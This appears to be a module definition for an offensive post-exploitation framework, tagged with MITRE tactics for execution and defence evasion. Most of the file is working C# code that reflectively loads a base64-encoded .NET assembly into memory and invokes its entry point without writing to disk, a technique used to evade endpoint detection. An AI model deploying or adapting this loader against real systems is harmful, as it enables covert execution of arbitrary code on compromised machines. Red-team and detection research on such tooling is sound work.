name: Assembly
authors:
  - name: Anthony Rose
    handle: Cx01N
    link: https://twitter.com/Cx01N_
description: |
  Reflectively loads the provided .NET assembly into memory and executes
  the Assembly through it's EntryPoint. The user provides all command line values
  for the assembly. This module can only execute the EntryPoint of the assembly and
  no other Assembly methods. Assembly is executed fully in memory without touching
  disk.
software: ''
tactics: [TA0002, TA0005]
techniques: [T1620]
background: false
output_extension: ''
needs_admin: false
opsec_safe: true
language: csharp
min_language_version: ''
options:
  - name: File
    description: Assembly file to execute.
    required: true
    type: file
  - name: Parameters
    description: The command-line parameters to pass to the assembly's EntryPoint.
    required: false
    value: ''
csharp:
  UnsafeCompile: false
  CompatibleDotNetVersions:
    - Net35
    - Net40
  Code: |
    using System;
    using System.IO;
    using System.Linq;
    using System.Reflection;
    using System.Collections.Generic;

    public static class Program
    {
        public static void Main(string[] args)
        {
            string assemblyB64 = args.Length > 0 ? args[0] : "";
            string parameters = args.Length > 1 ? args[1] : "";

            string result = ExecuteAssembly(assemblyB64, parameters);
            Console.WriteLine(result);
        }

        public static string ExecuteAssembly(string assemblyB64, string parameters = "")
        {
            using (StringWriter stringWriter = new StringWriter())
            {
                TextWriter originalOutput = Console.Out;
                TextWriter originalError = Console.Error;
                Console.SetOut(stringWriter);
                Console.SetError(stringWriter);

                try
                {
                    byte[] asmBytes = Convert.FromBase64String(assemblyB64);
                    var loadedAsm = Assembly.Load(asmBytes);

                    var entry = loadedAsm.EntryPoint;
                    if (entry == null)
                    {
                        stringWriter.WriteLine("Error: Assembly EntryPoint was null.");
                        return stringWriter.ToString();
                    }

                    string[] entryArgs = SplitCommandLine(parameters).ToArray();
                    var entryParams = entry.GetParameters();

                    object invokeResult;
                    if (entryParams.Length == 0)
                    {
                        invokeResult = entry.Invoke(null, null);
                    }
                    else if (entryParams.Length == 1 && entryParams[0].ParameterType == typeof(string[]))
                    {
                        invokeResult = entry.Invoke(null, new object[] { entryArgs });
                    }
                    else
                    {
                        stringWriter.WriteLine(
                            $"Error: Unsupported EntryPoint signature. Param count: {entryParams.Length}"
                        );
                        return stringWriter.ToString();
                    }

                    if (entry.ReturnType != typeof(void) && invokeResult != null)
                    {
                        stringWriter.WriteLine(invokeResult.ToString());
                    }
                }
                catch (Exception ex)
                {
                    stringWriter.WriteLine($"Error: {ex.Message}");
                    if (ex.InnerException != null)
                    {
                        stringWriter.WriteLine(
                            $"Inner Exception: {ex.InnerException.GetType().FullName}: {ex.InnerException.Message}"
                        );
                    }
                }
                finally
                {
                    Console.SetOut(originalOutput);
                    Console.SetError(originalError);
                }

                return stringWriter.ToString();
            }
        }

        private static IEnumerable<string> SplitCommandLine(string commandLine)
        {
            bool inQuotes = false;

            return commandLine.Split(c =>
            {
                if (c == '\"' || c == '\'')
                    inQuotes = !inQuotes;

                return !inQuotes && c == ' ';
            })
            .Select(arg => arg.Trim().TrimMatchingQuotes('\"').TrimMatchingQuotes('\''))
            .Where(arg => !string.IsNullOrEmpty(arg));
        }

        private static IEnumerable<string> Split(this string str, Func<char, bool> controller)
        {
            int nextPiece = 0;

            for (int c = 0; c < str.Length; c++)
            {
                if (controller(str[c]))
                {
                    yield return str.Substring(nextPiece, c - nextPiece);
                    nextPiece = c + 1;
                }
            }

            yield return str.Substring(nextPiece);
        }

        private static string TrimMatchingQuotes(this string input, char quote)
        {
            if ((input.Length >= 2) &&
                (input[0] == quote) && (input[input.Length - 1] == quote))
            {
                return input.Substring(1, input.Length - 2);
            }
            return input;
        }
    }
